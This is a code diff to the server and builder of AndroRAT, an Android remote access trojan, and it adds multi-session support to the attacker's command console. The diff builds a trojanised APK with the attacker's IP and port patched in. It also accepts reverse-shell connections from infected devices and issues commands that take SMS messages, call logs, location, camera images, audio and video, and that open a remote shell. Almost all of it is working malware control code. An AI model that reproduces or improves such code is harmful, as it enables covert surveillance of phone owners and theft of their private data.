@@ -1,6 +1,3 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-
 import sys
 import os
 import base64
@@ -13,20 +10,23 @@ import re
 from subprocess import PIPE, run
 import socket
 import threading
-import itertools
+import uuid
 import queue
 
 sys.stdout.reconfigure(encoding='utf-8')
 
-banner = """\033[1m\033[91m
-                    _           _____         _______
-    /\             | |         |  __ \     /\|__   __|
-   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
-  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
- / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
-/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|
+clients = {}  
+clients_lock = threading.Lock()
+suppress_new_sessions = threading.Event()
 
-                                       \033[93m- By karma9874
+banner = """\033[1m\033[91m
+                     _           _____         _______
+     /\             | |         |  __ \     /\|__   __|
+    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
+   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
+  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
+ /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
+                                        - By karma9874
 """
 
 pattern = '\"(\\d+\\.\\d+).*\"'
@@ -78,7 +78,7 @@ def executeCMD(command,queue):
 
 
 def getpwd(name):
-	return os.getcwd()+direc+name;
+    return os.getcwd()+direc+name;
 
 def help():
     helper="""
@@ -140,7 +140,7 @@ def readSMS(client,data):
             flag = 1
             print(stdOutput("error")+"Unable to decode the SMS\n")
     if flag == 1:
-    	os.remove(filename)
+        os.remove(filename)
 
 def getFile(filename,ext,data):
     fileData = "Dumps"+direc+filename+"."+ext
@@ -192,7 +192,7 @@ def shell(client):
             return
         msg = msg.split("\n")
         for i in msg[:-2]:
-            print(i)   
+            print(i)    
         print(" ")
         command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
         command = command+"\n"
@@ -208,10 +208,10 @@ def getLocation(sock):
         msg = recvall(sock)
         msg = msg.split("\n")
         for i in msg[:-2]:
-            print(i)   
+            print(i)    
         if("END123" in msg):
             return
-        print(" ")     
+        print(" ")      
 
 def recvall(sock):
     buff=""
@@ -222,18 +222,48 @@ def recvall(sock):
     return buff
 
 
-def recvallShell(sock):
-    buff=""
-    data = ""
-    ready = select.select([sock], [], [], 3)
-    while "END123" not in data:
-        if ready[0]:
-            data = sock.recv(4096).decode("UTF-8","ignore")
-            buff+=data
+def recvallShell(sock, timeout=3):
+    # non‑blocking read for interactive shell or it gets stuck
+    buff = ""
+    end_time = time.time() + timeout
+    while time.time() < end_time:
+        ready, _, _ = select.select([sock], [], [], 0.3)
+        if ready:
+            data = sock.recv(4096)
+            if not data:
+                return ""
+            buff += data.decode("utf-8", "ignore")
+            if "END123" in buff:
+                return buff.replace("END123", "").strip("\n")
         else:
-            buff="bogus"
-            return buff
-    return buff
+            continue
+    return "bogus"  # nothing received within timeout
+
+def recv_until(sock, marker="END123", timeout=2.0):
+    """
+    Non-blocking read for up to `timeout` seconds, returning everything
+    up to (but not including) `marker`. Returns None if socket closes.
+    """
+    buff = ""
+    end_time = time.time() + timeout
+    sock.setblocking(False)
+    try:
+        while time.time() < end_time:
+            ready, _, _ = select.select([sock], [], [], 0.1)
+            if not ready:
+                continue
+            chunk = sock.recv(4096)
+            if not chunk:
+                return None
+            buff += chunk.decode("utf-8", "ignore")
+            if marker in buff:
+                break
+    finally:
+        sock.setblocking(True)
+
+    if marker in buff:
+        return buff.split(marker, 1)[0].rstrip("\n")
+    return buff.rstrip("\n")
 
 def stopAudio(client):
     print(stdOutput("info")+"\033[0mDownloading Audio")
@@ -282,117 +312,302 @@ def callLogs(client):
     msg = recvall(client)
     filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
     if "No call logs" in msg:
-    	msg.split("\n")
-    	print(msg.replace("END123","").strip())
-    	print(" ")
-    else:
-    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-    		txt.write(msg)
-    		txt.close()
-    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
-    		if not os.path.getsize(filename):
-    			os.remove(filename)
-
-def get_shell(ip,port):
-    soc = socket.socket() 
-    soc = socket.socket(type=socket.SOCK_STREAM)
-    try:
-        # Restart the TCP server on exit
-        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        soc.bind((ip, int(port)))
-    except Exception as e:
-        print(stdOutput("error")+"\033[1m %s"%e);exit()
-
-    soc.listen(2)
-    print(banner)
-    while True:
-        que = queue.Queue()
-        t = threading.Thread(target=connection_checker,args=[soc,que])
-        t.daemon = True
-        t.start()
-        while t.is_alive(): animate("Waiting for Connections  ")
-        t.join()
-        conn, addr = que.get()
-        clear()
-        print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
+        msg.split("\n")
+        print(msg.replace("END123","").strip())
         print(" ")
-        while True:
-            msg = conn.recv(4024).decode("UTF-8")
-            if(msg.strip() == "IMAGE"):
-                getImage(conn)
-            elif("readSMS" in msg.strip()):
-                content = msg.strip().split(" ")
-                data = content[1]
-                readSMS(conn,data)
-            elif(msg.strip() == "SHELL"):
-                shell(conn)
-            elif(msg.strip() == "getLocation"):
-                getLocation(conn)
-            elif(msg.strip() == "stopVideo123"):
-                stopVideo(conn)
-            elif(msg.strip() == "stopAudio"):
-                stopAudio(conn)
-            elif(msg.strip() == "callLogs"):
-                callLogs(conn)
-            elif(msg.strip() == "help"):
-                help()
+    else:
+        with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
+            txt.write(msg)
+            txt.close()
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
+            if not os.path.getsize(filename):
+                os.remove(filename)
+
+def session_handler(conn, addr, client_id):
+    clear()
+    print(f"\033[1m\033[33mGot connection from \033[31m{addr}\033[0m")
+    device = clients[client_id].get('device', 'Unknown')
+    print(f"[*] Session {client_id}  Device: {device}\n")
+
+    prompt_top   = f"\033[1m\033[36mInterpreter({client_id}):/> \033[0m"
+    prompt_shell = f"\033[1m\033[36mRemoteShell({client_id}):$ \033[0m"
+    prompt = prompt_top
+    in_shell = False
+    detach = False
+
+    while True:
+        try:
+            cmd = input(prompt).strip()
+        except (KeyboardInterrupt, EOFError):
+            if in_shell:
+                conn.send(b"exit\n")
+                in_shell = False
+                prompt = prompt_top
+                print(stdOutput('info') + "Exited remote shell.")
+                continue
             else:
-                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
-            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
-            conn.send(message_to_send.encode("UTF-8"))
-            if message_to_send.strip() == "exit":
-                print(" ")
-                print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
-                sys.exit()
-            if(message_to_send.strip() == "clear"):clear()
+                print(stdOutput('info') + f"Detached from {client_id}\n")
+                detach = True
+                break
+
+        # handle local commands 
+        if not in_shell and cmd in {'help','clear','exit'}:
+            if cmd == 'help':
+                help(); continue
+            if cmd == 'clear':
+                clear(); continue
+            if cmd == 'exit':
+                print(stdOutput('info') + f"Detached from {client_id}\n")
+                detach = True
+                break
+
+        try:
+            conn.send((cmd + '\n').encode('utf-8'))
+        except (BrokenPipeError, ConnectionResetError):
+            print(stdOutput('error') + "Connection lost.")
+            break
+
+        reply = recv_until(conn, timeout=2.0)
+        if reply is None:
+            print(stdOutput('error') + "Connection closed by target.")
+            break
+
+        # call helper on certain receives
+        text = reply.strip()
+        if text == 'IMAGE':
+            getImage(conn)
+            continue
+        if text.startswith('readSMS'):
+            parts = text.split()
+            if len(parts) > 1:
+                readSMS(conn, parts[1])
+            continue
+        if text == 'SHELL':
+            in_shell = True
+            prompt = prompt_shell
+            continue
+        if text == 'getLocation':
+            getLocation(conn)
+            continue
+        if text == 'stopVideo123':
+            stopVideo(conn)
+            continue
+        if text == 'stopAudio':
+            stopAudio(conn)
+            continue
+        if text == 'callLogs':
+            callLogs(conn)
+            continue
+        if text == 'help':
+            help()
+            continue
+
+        if "Exiting Shell" in reply:
+            in_shell = False
+            prompt = prompt_top
+            continue
+
+        if reply:
+            print(reply)
+
+    if not detach:
+        conn.close()
+        with clients_lock:
+            clients.pop(client_id, None)
+        print(f"[-] Session {client_id} closed.\n")
 
 
-def connection_checker(socket,queue):
-    conn, addr = socket.accept()
-    queue.put([conn,addr])
-    return conn,addr
+def get_shell(ip, port):
+    soc = socket.socket()
+    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        soc.bind((ip, int(port)))
+        soc.listen(5)
+    except Exception as e:
+        print(stdOutput("error") + f"Bind failed: {e}")
+        sys.exit(1)
+
+    print(banner)
+    print(stdOutput("info") + f"Listening on {ip}:{port}\n")
+
+    def accept_loop():
+        while True:
+            try:
+                conn, addr = soc.accept()
+            except Exception:
+                continue
+
+            try:
+                conn.settimeout(0.5)
+                raw = conn.recv(1024).decode("utf-8", "ignore").strip()
+            except Exception:
+                raw = ""
+            finally:
+                conn.settimeout(None)
+
+            # drop HTTP requests. should filter by request name, but this works
+            if raw.startswith("GET ") or "HTTP" in raw:
+                conn.close()
+                continue
+
+            # manage duplicate sessions, may need to add bypass functionality for NATed addresses
+            with clients_lock:
+                existing = next((cid for cid, info in clients.items()
+                                if info["addr"][0] == addr[0]), None)
+            if existing:
+                old = clients[existing]["conn"]
+                try:
+                    old.close()
+                except:
+                    pass
+                with clients_lock:
+                    clients[existing]["conn"] = conn
+                    clients[existing]["addr"] = addr
+                
+                # extract model from welcome message
+                prefix = "Hello there, welcome to reverse shell of "
+                model = raw[len(prefix):] if raw.startswith(prefix) else clients[existing]["device"]
+                clean = re.sub(r'[^A-Za-z0-9_.-]', '_', model)
+                name = clean if len(clean) <= 16 else clean[:16] + "..."
+                with clients_lock:
+                    clients[existing]["device"] = name
+                continue
+
+            cid = uuid.uuid4().hex[:8]
+            with clients_lock:
+                clients[cid] = {"conn": conn, "addr": addr, "device": "Unknown"}
+
+            # extract model from welcome message
+            prefix = "Hello there, welcome to reverse shell of "
+            if raw.startswith(prefix):
+                model = raw[len(prefix):]
+            else:
+                model = raw or "Unknown"
+            clean = re.sub(r'[^A-Za-z0-9_.-]', '_', model)
+            name = clean if len(clean) <= 16 else clean[:16] + "..."
+            with clients_lock:
+                clients[cid]["device"] = name
+
+            # don't print "New session" when in interpreter 
+            if not suppress_new_sessions.is_set():
+                print(f"\n[+] New session {cid} from {addr}  Device: {name}")
+                sys.stdout.flush()
+
+
+    threading.Thread(target=accept_loop, daemon=True).start()
+
+    while True:
+        cmd = input("\033[1;32mAndroRAT>\033[0m ").strip()
+        if cmd == "list":
+            with clients_lock:
+                if not clients:
+                    print("No active sessions.\n")
+                else:
+                    print()
+                    for i, (cid, info) in enumerate(clients.items(), 1):
+                        print(f"  {i}. {cid} | {info['device']:<20} | {info['addr']}")
+            print()
+        elif cmd.startswith("attach"):
+            parts = cmd.split(maxsplit=1)
+            if len(parts) != 2 or not parts[1].strip().isdigit():
+                print(stdOutput("error") + "Usage: attach <session-number>\n")
+                continue
+            sel = int(parts[1].strip())
+            with clients_lock:
+                if sel < 1 or sel > len(clients):
+                    print(stdOutput("error") +
+                        "Invalid session number. Use 'list' to see active sessions.\n")
+                    continue
+                cid  = list(clients.keys())[sel - 1]
+                info = clients[cid]
+                
+                suppress_new_sessions.set()
+            try:
+                session_handler(info["conn"], info["addr"], cid)
+            except Exception as e:
+                print(stdOutput("error") + f"Session error: {e}\n")
+            finally:
+                suppress_new_sessions.clear()
+        elif cmd in ("help", "?"):
+            print("""
+    Commands:
+      list             – show all active sessions
+      attach <number>  – interact with a session by its number
+      help, ?          – show this help menu
+      exit             – quit the server
+    """)
+        elif cmd == "exit":
+            print("Shutting down server.")
+            soc.close()
+            os._exit(0)
+        elif not cmd:
+            pass
+        else:
+            print("Unknown command. Type 'help' for available commands.\n")
+
+
+# this function is no longer needed with the new threaded model
+# def connection_checker(socket,queue):
+#     conn, addr = socket.accept()
+#     queue.put([conn,addr])
+#     return conn,addr
 
 
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
     editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     try:
-        file = open(editor,"r").readlines()
-        #Very much uncertaninity but cant think any other way to do it xD
-        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
-        file[23]=file[23][:21]+"\""+port+"\""+"\n"
-        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
-        str_file="".join([str(elem) for elem in file])
-        open(editor,"w").write(str_file)
+        with open(editor, "r") as f:
+            file = f.readlines()
+        
+        file[18] = file[18][:21] + "\"" + ip + "\"" + "\n"
+        file[23] = file[23][:21] + "\"" + port + "\"" + "\n"
+        file[28] = file[28][:15] + " 0x0" + "\n" if icon else file[28][:15] + " 0x1" + "\n"
+        
+        str_file="".join(file)
+        with open(editor,"w") as f:
+            f.write(str_file)
+
     except Exception as e:
-        print(e)
+        print(stdOutput("error") + f"Failed to modify smali file: {e}")
         sys.exit()
+
     java_version = execute("java -version")
-    if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
-    #version_no = re.search(pattern, java_version.stderr).groups()[0]
-    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
+    if java_version.returncode: 
+        print(stdOutput("error")+"Java not installed or found on PATH");
+        exit()
+
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
-    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
+    
+    # Build APK
+    t = threading.Thread(target=executeCMD,args=[f"java -jar Jar_utils/apktool.jar b Compiled_apk -o {outFileName}", que])
     t.start()
-    while t.is_alive(): animate("Building APK ")
+    while t.is_alive(): 
+        animate("Building APK ")
     t.join()
     print(" ")
+
     resOut = que.get()
     if not resOut.returncode:
-        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
-        print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
+        print(stdOutput("success")+"Successfully built APK in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
+        print(stdOutput("info")+"\033[0mSigning the APK")
+        
+        # Sign APK
+        t = threading.Thread(target=executeCMD,args=[f"java -jar Jar_utils/sign.jar -a {outFileName} --overwrite", que])
         t.start()
-        while t.is_alive(): animate("Signing Apk ")
+        while t.is_alive(): 
+            animate("Signing APK ")
         t.join()
         print(" ")
+
         resOut = que.get()
         if not resOut.returncode:
-            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
+            print(stdOutput("success")+"Successfully signed the APK \033[1m\033[32m"+outFileName+"\033[0m")
             if ngrok:
                 clear()
-                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
+                listen_port = ng if ng else 8000
+                get_shell("0.0.0.0", listen_port)
             print(" ")
         else:
             print("\r"+resOut.stderr)
